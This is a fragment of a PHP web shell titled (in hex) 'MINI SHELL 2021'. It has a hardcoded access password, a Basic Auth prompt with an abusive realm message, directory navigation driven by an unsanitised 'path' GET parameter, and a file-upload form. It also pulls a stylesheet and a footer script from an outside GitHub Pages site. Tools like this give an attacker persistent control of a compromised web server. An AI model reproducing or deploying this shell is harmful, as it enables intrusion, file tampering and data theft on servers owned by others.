...
$pass = "Sniper6969";
...

 {
  ...
  header("WWW-Authenticate: Basic realm=\"Mau ngapain kontol ??\"");
...
$sname       = "\x4d\x49\x4e\x49\x20\x53\x48\x45\x4c\x4c\x20\x32\x30\x32\x31";
...
echo '<!DOCTYPE html><html><head><meta name="robots" content"noindex. nofollow"><link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet"><title>'.$sname.'</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><link href="https://sniperxxx.github.io/sniper404/mini.css" rel="stylesheet" type="text/css"></head><body>';

echo '<div style="color:#00FFFF;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
...
echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#00FFFF;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
...
echo '<script type="text/javascript" src="https://sniperxxx.github.io/sniper404/Footer.js"></script>';
echo '</body></html><!-- EOF -->';
?>
